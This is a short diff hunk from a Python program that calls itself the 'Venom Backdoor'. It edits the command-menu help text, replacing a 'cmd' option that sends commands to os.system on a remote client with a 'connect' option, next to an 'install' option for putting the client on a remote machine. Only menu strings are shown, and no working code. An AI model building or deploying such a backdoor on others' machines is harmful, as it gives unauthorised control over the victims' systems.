@@ -58,7 +58,7 @@ def printHelp():
     print("""
 Venom Backdoor Commands:
     
-    cmd     |     Enters menu to send commands directly to os.system on remote client.
+    connect |     Connects to remote client.
     install |     Prepares to install Venom client on remote machine.
 """)
 main()
